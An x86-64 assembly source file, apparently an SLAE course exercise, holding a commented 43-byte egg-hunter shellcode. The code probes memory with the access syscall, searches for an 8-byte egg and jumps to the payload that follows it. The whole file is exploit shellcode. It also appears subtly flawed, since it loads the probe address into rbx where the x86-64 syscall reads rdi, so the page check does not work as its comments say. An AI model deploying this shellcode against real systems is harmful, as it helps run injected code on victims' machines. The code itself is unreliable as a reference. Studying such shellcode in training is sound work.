;SLAE-1322 Andriy Brukhovetskyy
;egg hunting explained some techniques  
;http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
;43 bytes

global _start
section .text
_start:

    xor rcx, rcx    ; 0
        
get_memory_block:
    ;getconf PAGE_SIZE in x64 is the same
    or dx, 0xfff    ; is the same as "add dx, 4095" (PAGE_SIZE)
        
checker:

    inc rdx         ; next memory offset
    push byte +0x15 ; __NR_access 21
    pop rax

    lea rbx, [rdx+8] ; alignment to validate the last four bytes of the signature
                     ; rcx already contains 0 (F_OK)
    syscall          ; syscall
    ;grep EFAULT /usr/include/asm-generic/errno-base.h
    ;bad address = EFAULT = 0xf2 = -14
    cmp al, 0xf2; because it's not a file

    jz get_memory_block ; if is not, loop

    mov rax, 0x5090509050905090 ; egg here in little endiant
    mov rdi, rdx
    
    scasq
    jnz checker ; return and search

    jmp rdi; if we here == we found the eggs, jump to our shellcode :)